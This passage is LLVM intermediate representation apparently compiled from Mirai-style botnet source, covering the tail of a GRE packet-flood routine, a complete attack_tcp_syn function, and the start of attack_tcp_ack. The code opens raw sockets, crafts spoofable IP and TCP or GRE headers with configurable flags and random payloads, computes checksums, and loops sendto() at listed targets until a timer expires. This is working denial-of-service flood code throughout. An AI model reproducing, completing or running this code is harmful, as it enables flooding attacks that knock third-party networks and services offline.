  %49 = xor i16 %16, -1
  %50 = icmp eq i8 %29, 0
  %51 = add nsw i64 %43, 8
  %52 = trunc i64 %51 to i16
  %.promoted = load i32, i32* %6, align 4
  %53 = sext i32 %.promoted to i64
  %54 = zext i8 %1 to i64
  br label %77

; <label>:55:                                     ; preds = %37
  %56 = call i32 @close(i32 %35) #10
  br label %.loopexit

..preheader_crit_edge:                            ; preds = %124
  %57 = trunc i64 %indvars.iv.next to i32
  store i32 %57, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader136, %..preheader_crit_edge
  %58 = icmp eq i8 %1, 0
  %sext = shl i64 %34, 32
  %59 = ashr exact i64 %sext, 32
  %60 = icmp eq i32 %31, -1
  %61 = and i32 %15, 65535
  %62 = icmp eq i32 %61, 65535
  %63 = and i32 %21, 65535
  %64 = icmp eq i32 %63, 65535
  %65 = and i32 %23, 65535
  %66 = icmp eq i32 %65, 65535
  %67 = icmp eq i8 %29, 0
  %68 = bitcast i32* %7 to i8*
  %69 = bitcast i32* %8 to i8*
  %70 = bitcast i32* %9 to i8*
  %71 = getelementptr inbounds i8, i8* %70, i64 2
  %72 = icmp eq i8 %27, 0
  %73 = sext i32 %25 to i64
  %74 = add i32 %25, 8
  %75 = add nsw i64 %73, 66
  %76 = sext i32 %25 to i64
  br label %136

; <label>:77:                                     ; preds = %.lr.ph138, %124
  %indvars.iv = phi i64 [ %53, %.lr.ph138 ], [ %indvars.iv.next, %124 ]
  %78 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %79 = getelementptr inbounds i8*, i8** %12, i64 %indvars.iv
  store i8* %78, i8** %79, align 8
  %80 = getelementptr inbounds i8, i8* %78, i64 38
  %81 = getelementptr inbounds i8, i8* %78, i64 58
  store i8 69, i8* %78, align 4
  %82 = getelementptr inbounds i8, i8* %78, i64 1
  store i8 %14, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext %45) #11
  %84 = getelementptr inbounds i8, i8* %78, i64 2
  %85 = bitcast i8* %84 to i16*
  store i16 %83, i16* %85, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %16) #11
  %87 = getelementptr inbounds i8, i8* %78, i64 4
  %88 = bitcast i8* %87 to i16*
  store i16 %86, i16* %88, align 4
  %89 = getelementptr inbounds i8, i8* %78, i64 8
  store i8 %18, i8* %89, align 4
  br i1 %46, label %90, label %94

; <label>:90:                                     ; preds = %77
  %91 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %92 = getelementptr inbounds i8, i8* %78, i64 6
  %93 = bitcast i8* %92 to i16*
  store i16 %91, i16* %93, align 2
  br label %94

; <label>:94:                                     ; preds = %90, %77
  %95 = getelementptr inbounds i8, i8* %78, i64 9
  store i8 47, i8* %95, align 1
  %96 = getelementptr inbounds i8, i8* %78, i64 12
  %97 = bitcast i8* %96 to i32*
  store i32 %31, i32* %97, align 4
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %99 = load i32, i32* %98, align 4
  %100 = getelementptr inbounds i8, i8* %78, i64 16
  %101 = bitcast i8* %100 to i32*
  store i32 %99, i32* %101, align 4
  %102 = call zeroext i16 @htons(i16 zeroext 25944) #11
  %103 = getelementptr inbounds i8, i8* %78, i64 22
  %104 = bitcast i8* %103 to i16*
  store i16 %102, i16* %104, align 2
  %105 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %106 = getelementptr inbounds i8, i8* %78, i64 36
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 1
  store i8 69, i8* %80, align 4
  %108 = getelementptr inbounds i8, i8* %78, i64 39
  store i8 %14, i8* %108, align 1
  %109 = call zeroext i16 @htons(i16 zeroext %48) #11
  %110 = getelementptr inbounds i8, i8* %78, i64 40
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %49) #11
  %113 = getelementptr inbounds i8, i8* %78, i64 42
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %78, i64 46
  store i8 %18, i8* %115, align 4
  br i1 %46, label %116, label %120

; <label>:116:                                    ; preds = %94
  %117 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %118 = getelementptr inbounds i8, i8* %78, i64 44
  %119 = bitcast i8* %118 to i16*
  store i16 %117, i16* %119, align 2
  br label %120

; <label>:120:                                    ; preds = %116, %94
  %121 = getelementptr inbounds i8, i8* %78, i64 47
  store i8 17, i8* %121, align 1
  br i1 %50, label %124, label %122

; <label>:122:                                    ; preds = %120
  %123 = load i32, i32* %101, align 4
  br label %124

; <label>:124:                                    ; preds = %120, %122
  %.sink = phi i32 [ %123, %122 ], [ 1023, %120 ]
  %125 = getelementptr inbounds i8, i8* %78, i64 54
  %126 = bitcast i8* %125 to i32*
  store i32 %.sink, i32* %126, align 4
  %127 = call zeroext i16 @htons(i16 zeroext %22) #11
  %128 = bitcast i8* %81 to i16*
  store i16 %127, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %24) #11
  %130 = getelementptr inbounds i8, i8* %78, i64 60
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 2
  %132 = call zeroext i16 @htons(i16 zeroext %52) #11
  %133 = getelementptr inbounds i8, i8* %78, i64 62
  %134 = bitcast i8* %133 to i16*
  store i16 %132, i16* %134, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %135 = icmp slt i64 %indvars.iv.next, %54
  br i1 %135, label %77, label %..preheader_crit_edge

; <label>:136:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %58, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %136
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %185
  %storemerge135137 = phi i32 [ %215, %185 ], [ 0, %.lr.ph.preheader ]
  %137 = sext i32 %storemerge135137 to i64
  %138 = getelementptr inbounds i8*, i8** %12, i64 %137
  %139 = load i8*, i8** %138, align 8
  %140 = getelementptr inbounds i8, i8* %139, i64 24
  %141 = getelementptr inbounds i8, i8* %139, i64 38
  %142 = bitcast i8* %141 to %struct.iphdr*
  %143 = getelementptr inbounds i8, i8* %139, i64 58
  %144 = getelementptr inbounds i8, i8* %139, i64 66
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %137, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = icmp ult i8 %146, 32
  br i1 %147, label %148, label %155

; <label>:148:                                    ; preds = %.lr.ph
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %137, i32 1
  %150 = load i32, i32* %149, align 4
  %151 = call i32 @ntohl(i32 %150) #11
  %152 = call i32 @htonl(i32 %151) #11
  %153 = getelementptr inbounds i8, i8* %139, i64 16
  %154 = bitcast i8* %153 to i32*
  store i32 %152, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %148, %.lr.ph
  br i1 %60, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %139, i64 12
  %158 = bitcast i8* %157 to i32*
  store i32 0, i32* %158, align 4
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %62, label %160, label %165

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %139, i64 4
  %162 = bitcast i8* %161 to i16*
  store i16 0, i16* %162, align 4
  %163 = getelementptr inbounds i8, i8* %139, i64 42
  %164 = bitcast i8* %163 to i16*
  store i16 999, i16* %164, align 4
  br label %165

; <label>:165:                                    ; preds = %160, %159
  br i1 %64, label %166, label %168

; <label>:166:                                    ; preds = %165
  %167 = bitcast i8* %143 to i16*
  store i16 0, i16* %167, align 2
  br label %168

; <label>:168:                                    ; preds = %166, %165
  br i1 %66, label %169, label %172

; <label>:169:                                    ; preds = %168
  %170 = getelementptr inbounds i8, i8* %139, i64 60
  %171 = bitcast i8* %170 to i16*
  store i16 0, i16* %171, align 2
  br label %172

; <label>:172:                                    ; preds = %169, %168
  br i1 %67, label %177, label %173

; <label>:173:                                    ; preds = %172
  %174 = getelementptr inbounds i8, i8* %139, i64 16
  %175 = bitcast i8* %174 to i32*
  %176 = load i32, i32* %175, align 4
  br label %177

; <label>:177:                                    ; preds = %172, %173
  %.sink3 = phi i32 [ %176, %173 ], [ 0, %172 ]
  %178 = getelementptr inbounds i8, i8* %139, i64 54
  %179 = bitcast i8* %178 to i32*
  store i32 %.sink3, i32* %179, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  call void @util_memcpy(i8* %140, i8* nonnull %68, i32 4) #10
  %180 = getelementptr inbounds i8, i8* %139, i64 30
  call void @util_memcpy(i8* %180, i8* nonnull %69, i32 4) #10
  %181 = getelementptr inbounds i8, i8* %139, i64 28
  call void @util_memcpy(i8* %181, i8* nonnull %70, i32 2) #10
  %182 = getelementptr inbounds i8, i8* %139, i64 34
  call void @util_memcpy(i8* %182, i8* %71, i32 2) #10
  br i1 %72, label %185, label %183

; <label>:183:                                    ; preds = %177
  call void @rand_alphastr(i8* nonnull %144, i32 %25)
  %184 = getelementptr inbounds i8, i8* %144, i64 %76
  store i8 0, i8* %184, align 1
  br label %185

; <label>:185:                                    ; preds = %177, %183
  %186 = getelementptr inbounds i8, i8* %139, i64 10
  %187 = bitcast i8* %186 to i16*
  store i16 0, i16* %187, align 2
  %188 = bitcast i8* %139 to i16*
  %189 = call zeroext i16 @checksum_generic(i16* %188, i32 20)
  store i16 %189, i16* %187, align 2
  %190 = getelementptr inbounds i8, i8* %139, i64 48
  %191 = bitcast i8* %190 to i16*
  store i16 0, i16* %191, align 2
  %192 = bitcast i8* %141 to i16*
  %193 = call zeroext i16 @checksum_generic(i16* %192, i32 20)
  store i16 %193, i16* %191, align 2
  %194 = getelementptr inbounds i8, i8* %139, i64 64
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  %196 = getelementptr inbounds i8, i8* %139, i64 62
  %197 = bitcast i8* %196 to i16*
  %198 = load i16, i16* %197, align 2
  %199 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %142, i8* nonnull %143, i16 zeroext %198, i32 %74)
  store i16 %199, i16* %195, align 2
  %200 = load i32, i32* %6, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %201, i32 0, i32 0
  store i16 2, i16* %202, align 4
  %203 = getelementptr inbounds i8, i8* %139, i64 16
  %204 = bitcast i8* %203 to i32*
  %205 = load i32, i32* %204, align 4
  %206 = load i32, i32* %6, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %207, i32 0, i32 2, i32 0
  store i32 %205, i32* %208, align 4
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %207, i32 0, i32 1
  store i16 0, i16* %209, align 2
  %210 = sext i32 %206 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %210, i32 0
  %212 = bitcast %struct.sockaddr_in* %211 to %struct.sockaddr*
  %213 = call i64 @sendto(i32 %35, i8* nonnull %139, i64 %75, i32 16384, %struct.sockaddr* %212, i32 16) #10
  %214 = load i32, i32* %6, align 4
  %215 = add nsw i32 %214, 1
  store i32 %215, i32* %6, align 4
  %216 = icmp slt i32 %215, %41
  br i1 %216, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %185
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %136
  %217 = call i64 @time(i64* null) #10
  %218 = icmp sgt i64 %217, %59
  br i1 %218, label %.loopexit.loopexit, label %136

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %55
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 16, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 17, i32 0)
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 10, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 11, i32 0)
  %27 = trunc i32 %26 to i16
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 12, i32 0)
  %29 = trunc i32 %28 to i16
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 13, i32 0)
  %31 = trunc i32 %30 to i16
  %32 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 14, i32 1)
  %33 = trunc i32 %32 to i16
  %34 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 15, i32 0)
  %35 = trunc i32 %34 to i16
  %36 = load i32, i32* @LOCAL_ADDR, align 4
  %37 = tail call i32 @attack_get_opt_ip(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %36)
  %38 = tail call i64 @time(i64* null) #10
  %39 = zext i32 %0 to i64
  %40 = add i64 %38, %39
  %41 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %.loopexit, label %43

; <label>:43:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %44 = bitcast i32* %6 to i8*
  %45 = call i32 @setsockopt(i32 %41, i32 0, i32 3, i8* nonnull %44, i32 4) #10
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %70, label %.preheader131

.preheader131:                                    ; preds = %43
  store i32 0, i32* %6, align 4
  %47 = zext i8 %1 to i32
  %48 = icmp eq i8 %1, 0
  br i1 %48, label %.preheader, label %.lr.ph133

.lr.ph133:                                        ; preds = %.preheader131
  %49 = icmp eq i8 %17, 0
  %50 = trunc i32 %22 to i16
  %51 = and i8 %25, 1
  %52 = zext i8 %51 to i16
  %53 = shl nuw nsw i16 %52, 13
  %54 = shl i16 %27, 12
  %55 = and i16 %54, 4096
  %56 = shl i16 %29, 11
  %57 = and i16 %56, 2048
  %58 = shl i16 %31, 10
  %59 = and i16 %58, 1024
  %60 = shl i16 %33, 9
  %61 = and i16 %60, 512
  %62 = shl i16 %35, 8
  %63 = and i16 %62, 256
  %64 = or i16 %53, %55
  %65 = or i16 %64, %57
  %66 = or i16 %65, %59
  %.masked = or i16 %66, %61
  %67 = or i16 %.masked, %63
  %.promoted = load i32, i32* %6, align 4
  %68 = sext i32 %.promoted to i64
  %69 = zext i8 %1 to i64
  br label %85

; <label>:70:                                     ; preds = %43
  %71 = call i32 @close(i32 %41) #10
  br label %.loopexit

..preheader_crit_edge:                            ; preds = %102
  %72 = trunc i64 %indvars.iv.next to i32
  store i32 %72, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader131, %..preheader_crit_edge
  %73 = icmp eq i8 %1, 0
  %sext = shl i64 %40, 32
  %74 = ashr exact i64 %sext, 32
  %75 = icmp eq i32 %37, -1
  %76 = and i32 %12, 65535
  %77 = icmp eq i32 %76, 65535
  %78 = and i32 %18, 65535
  %79 = icmp eq i32 %78, 65535
  %80 = and i32 %20, 65535
  %81 = icmp eq i32 %80, 65535
  %82 = icmp eq i32 %22, 65535
  %83 = icmp eq i32 %23, 65535
  %84 = icmp eq i8 %25, 0
  br label %138

; <label>:85:                                     ; preds = %.lr.ph133, %102
  %indvars.iv = phi i64 [ %68, %.lr.ph133 ], [ %indvars.iv.next, %102 ]
  %86 = call noalias i8* @calloc(i64 128, i64 1) #10
  %87 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  store i8* %86, i8** %87, align 8
  %88 = getelementptr inbounds i8, i8* %86, i64 20
  %89 = getelementptr inbounds i8, i8* %86, i64 40
  store i8 69, i8* %86, align 4
  %90 = getelementptr inbounds i8, i8* %86, i64 1
  store i8 %11, i8* %90, align 1
  %91 = call zeroext i16 @htons(i16 zeroext 60) #11
  %92 = getelementptr inbounds i8, i8* %86, i64 2
  %93 = bitcast i8* %92 to i16*
  store i16 %91, i16* %93, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %13) #11
  %95 = getelementptr inbounds i8, i8* %86, i64 4
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 4
  %97 = getelementptr inbounds i8, i8* %86, i64 8
  store i8 %15, i8* %97, align 4
  br i1 %49, label %102, label %98

; <label>:98:                                     ; preds = %85
  %99 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %100 = getelementptr inbounds i8, i8* %86, i64 6
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 2
  br label %102

; <label>:102:                                    ; preds = %85, %98
  %103 = getelementptr inbounds i8, i8* %86, i64 9
  store i8 6, i8* %103, align 1
  %104 = getelementptr inbounds i8, i8* %86, i64 12
  %105 = bitcast i8* %104 to i32*
  store i32 %37, i32* %105, align 4
  %106 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %107 = load i32, i32* %106, align 4
  %108 = getelementptr inbounds i8, i8* %86, i64 16
  %109 = bitcast i8* %108 to i32*
  store i32 %107, i32* %109, align 4
  %110 = call zeroext i16 @htons(i16 zeroext %19) #11
  %111 = bitcast i8* %88 to i16*
  store i16 %110, i16* %111, align 4
  %112 = call zeroext i16 @htons(i16 zeroext %21) #11
  %113 = getelementptr inbounds i8, i8* %86, i64 22
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 2
  %115 = call zeroext i16 @htons(i16 zeroext %50) #11
  %116 = zext i16 %115 to i32
  %117 = getelementptr inbounds i8, i8* %86, i64 24
  %118 = bitcast i8* %117 to i32*
  store i32 %116, i32* %118, align 4
  %119 = getelementptr inbounds i8, i8* %86, i64 32
  %120 = bitcast i8* %119 to i16*
  %121 = load i16, i16* %120, align 4
  %122 = and i16 %121, -16369
  %123 = or i16 %67, %122
  %124 = or i16 %123, 160
  store i16 %124, i16* %120, align 4
  %125 = getelementptr inbounds i8, i8* %86, i64 41
  store i8 2, i8* %89, align 1
  %126 = getelementptr inbounds i8, i8* %86, i64 42
  store i8 4, i8* %125, align 1
  %127 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %128 = bitcast i8* %126 to i16*
  store i16 %127, i16* %128, align 2
  %129 = getelementptr inbounds i8, i8* %86, i64 44
  %130 = getelementptr inbounds i8, i8* %86, i64 45
  store i8 4, i8* %129, align 1
  %131 = getelementptr inbounds i8, i8* %86, i64 46
  store i8 2, i8* %130, align 1
  %132 = getelementptr inbounds i8, i8* %86, i64 47
  store i8 8, i8* %131, align 1
  store i8 10, i8* %132, align 1
  %133 = getelementptr inbounds i8, i8* %86, i64 56
  %134 = getelementptr inbounds i8, i8* %86, i64 57
  store i8 1, i8* %133, align 1
  %135 = getelementptr inbounds i8, i8* %86, i64 58
  store i8 3, i8* %134, align 1
  %136 = getelementptr inbounds i8, i8* %86, i64 59
  store i8 3, i8* %135, align 1
  store i8 6, i8* %136, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %137 = icmp slt i64 %indvars.iv.next, %69
  br i1 %137, label %85, label %..preheader_crit_edge

; <label>:138:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %73, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %138
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %181
  %storemerge124132 = phi i32 [ %200, %181 ], [ 0, %.lr.ph.preheader ]
  %139 = sext i32 %storemerge124132 to i64
  %140 = getelementptr inbounds i8*, i8** %9, i64 %139
  %141 = load i8*, i8** %140, align 8
  %142 = bitcast i8* %141 to %struct.iphdr*
  %143 = getelementptr inbounds i8, i8* %141, i64 20
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %139, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = icmp ult i8 %145, 32
  br i1 %146, label %147, label %154

; <label>:147:                                    ; preds = %.lr.ph
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %139, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @ntohl(i32 %149) #11
  %151 = call i32 @htonl(i32 %150) #11
  %152 = getelementptr inbounds i8, i8* %141, i64 16
  %153 = bitcast i8* %152 to i32*
  store i32 %151, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %147, %.lr.ph
  br i1 %75, label %155, label %158

; <label>:155:                                    ; preds = %154
  %156 = getelementptr inbounds i8, i8* %141, i64 12
  %157 = bitcast i8* %156 to i32*
  store i32 0, i32* %157, align 4
  br label %158

; <label>:158:                                    ; preds = %155, %154
  br i1 %77, label %159, label %162

; <label>:159:                                    ; preds = %158
  %160 = getelementptr inbounds i8, i8* %141, i64 4
  %161 = bitcast i8* %160 to i16*
  store i16 0, i16* %161, align 4
  br label %162

; <label>:162:                                    ; preds = %159, %158
  br i1 %79, label %163, label %165

; <label>:163:                                    ; preds = %162
  %164 = bitcast i8* %143 to i16*
  store i16 0, i16* %164, align 4
  br label %165

; <label>:165:                                    ; preds = %163, %162
  br i1 %81, label %166, label %169

; <label>:166:                                    ; preds = %165
  %167 = getelementptr inbounds i8, i8* %141, i64 22
  %168 = bitcast i8* %167 to i16*
  store i16 0, i16* %168, align 2
  br label %169

; <label>:169:                                    ; preds = %166, %165
  br i1 %82, label %170, label %173

; <label>:170:                                    ; preds = %169
  %171 = getelementptr inbounds i8, i8* %141, i64 24
  %172 = bitcast i8* %171 to i32*
  store i32 0, i32* %172, align 4
  br label %173

; <label>:173:                                    ; preds = %170, %169
  br i1 %83, label %174, label %177

; <label>:174:                                    ; preds = %173
  %175 = getelementptr inbounds i8, i8* %141, i64 28
  %176 = bitcast i8* %175 to i32*
  store i32 0, i32* %176, align 4
  br label %177

; <label>:177:                                    ; preds = %174, %173
  br i1 %84, label %181, label %178

; <label>:178:                                    ; preds = %177
  %179 = getelementptr inbounds i8, i8* %141, i64 38
  %180 = bitcast i8* %179 to i16*
  store i16 0, i16* %180, align 2
  br label %181

; <label>:181:                                    ; preds = %177, %178
  %182 = getelementptr inbounds i8, i8* %141, i64 10
  %183 = bitcast i8* %182 to i16*
  store i16 0, i16* %183, align 2
  %184 = bitcast i8* %141 to i16*
  %185 = call zeroext i16 @checksum_generic(i16* %184, i32 20)
  store i16 %185, i16* %183, align 2
  %186 = getelementptr inbounds i8, i8* %141, i64 36
  %187 = bitcast i8* %186 to i16*
  store i16 0, i16* %187, align 4
  %188 = call zeroext i16 @htons(i16 zeroext 40) #11
  %189 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %142, i8* %143, i16 zeroext %188, i32 40)
  store i16 %189, i16* %187, align 4
  %190 = getelementptr inbounds i8, i8* %141, i64 22
  %191 = bitcast i8* %190 to i16*
  %192 = load i16, i16* %191, align 2
  %193 = load i32, i32* %6, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %194, i32 0, i32 1
  store i16 %192, i16* %195, align 2
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %194, i32 0
  %197 = bitcast %struct.sockaddr_in* %196 to %struct.sockaddr*
  %198 = call i64 @sendto(i32 %41, i8* %141, i64 60, i32 16384, %struct.sockaddr* %197, i32 16) #10
  %199 = load i32, i32* %6, align 4
  %200 = add nsw i32 %199, 1
  store i32 %200, i32* %6, align 4
  %201 = icmp slt i32 %200, %47
  br i1 %201, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %181
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %138
  %202 = call i64 @time(i64* null) #10
  %203 = icmp sgt i64 %202, %74
  br i1 %203, label %.loopexit.loopexit, label %138

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 16, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 17, i32 65535)
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 10, i32 0)
  %25 = trunc i32 %24 to i16
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 11, i32 1)
  %27 = trunc i32 %26 to i16
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 12, i32 0)
  %29 = trunc i32 %28 to i8
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 13, i32 0)
  %31 = trunc i32 %30 to i16
  %32 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 14, i32 0)
  %33 = trunc i32 %32 to i16
  %34 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 15, i32 0)
  %35 = trunc i32 %34 to i16
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %38 = trunc i32 %37 to i8
  %39 = load i32, i32* @LOCAL_ADDR, align 4
  %40 = tail call i32 @attack_get_opt_ip(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %39)
  %41 = tail call i64 @time(i64* null) #10
  %42 = zext i32 %0 to i64
  %43 = add i64 %41, %42
  %44 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %.loopexit, label %46

; <label>:46:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %47 = bitcast i32* %6 to i8*
  %48 = call i32 @setsockopt(i32 %44, i32 0, i32 3, i8* nonnull %47, i32 4) #10
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %75, label %.preheader134

.preheader134:                                    ; preds = %46
  store i32 0, i32* %6, align 4
  %50 = zext i8 %1 to i32
  %51 = icmp eq i8 %1, 0
  br i1 %51, label %.preheader, label %.lr.ph136

.lr.ph136:                                        ; preds = %.preheader134
  %52 = sext i32 %36 to i64
  %53 = add nsw i64 %52, 40
  %54 = trunc i64 %53 to i16
  %55 = icmp eq i8 %17, 0
  %56 = trunc i32 %22 to i16
  %57 = shl i16 %25, 13
  %58 = and i16 %57, 8192
  %59 = shl i16 %27, 12
  %60 = and i16 %59, 4096
  %61 = and i8 %29, 1
  %62 = zext i8 %61 to i16
  %63 = shl nuw nsw i16 %62, 11
  %64 = shl i16 %31, 10
  %65 = and i16 %64, 1024
